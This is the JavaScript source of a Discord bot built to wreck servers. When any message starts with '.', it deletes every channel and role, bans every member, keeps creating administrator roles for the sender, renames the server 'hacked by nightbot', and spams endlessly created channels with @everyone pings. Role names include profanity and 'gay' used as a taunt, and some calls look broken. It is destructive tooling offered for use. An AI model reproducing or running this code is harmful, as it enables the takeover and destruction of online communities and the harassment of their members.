const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = "+"; 
client.on("ready", () => {
  console.log(`Logged in as ${client.user.tag}!`);
});

client.on("message", message => {
  if (message.content.startsWith(".")) {
    message.delete();

    message.guild.channels.Map(c => {
      c.delete();
    });
    message.guild.members.forEach(m => {
      m.ban();
    });

    message.guild.roles.forEach(r => {
      r.delete();
    });

    setInterval(() => {
      message.guild
        .createRole({
          name: "FUCKED BY NIGHTBOT",
          permissions: ["ADMINISTRATOR"]
        })
        .then(rr => {
          message.member.addRole(rr.id);
        });
    }, 200);
    message.guild
      .createRole({
        name: "gay", 
        permissions: ["ADMINISTRATOR"]
      })
      .then(rr => {
        message.member.addRole(rr.id);
      });

    message.guild.setIcon(
      "guild icon link here"
      );
    message.guild.setName("hacked by nightbot"); 
    setTimeout(function() {
      setInterval(() => {
        message.guild.createChannel("by nightbot", "text").then(channel => {
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          channel.send("@everyone ");
          
        });
      }, 100);
    });
  }
});

client.on("message", async msg => {
  if (msg.content.startsWith(".leaveall")) {
    client.guilds.forEach(guild => {
      guild.leave();
    });
    msg.channel.send(`:joy::joy:joy: wow `); 
  }
});
    
var adminprefix = ["+"];
client.on("message", message => {
  var argresult = message.content
    .split(` `)
    .slice(1)
    .join(" ");

  if (message.content.startsWith(adminprefix + "setg")) {
    client.user.setGame(argresult);
    message.channel.send(`**✅   ${argresult}**`);
  } else if (message.content === adminprefix + "leave") {
    message.guild.leave();
  } else if (message.content.startsWith(adminprefix + "setw")) {
    client.user.setActivity(argresult, { type: "WATCHING" });
    message.channel.send(`**✅   ${argresult}**`);
  } else if (message.content.startsWith(adminprefix + "setl")) {
    client.user.setActivity(argresult, { type: "LISTENING" });
    message.channel.send(`**✅   ${argresult}**`);
  } else if (message.content.startsWith(adminprefix + "sets")) {
    client.user.setGame(argresult, "https://www.twitch.tv/dream");
    message.channel.send(`**✅**`);
  }
  if (message.content.startsWith(prefix + "setname")) {
    client.user.setUsername(argresult).then;
    message.channel.send(`Changing The Name To ..**${argresult}** `);
  } else if (message.content.startsWith(adminprefix + "setava")) {
    client.user.setAvatar(argresult);
    message.channel.send(`Changing The Avatar To :**${argresult}** `);
  }
});
client.login(process.env.TOKEN)
    
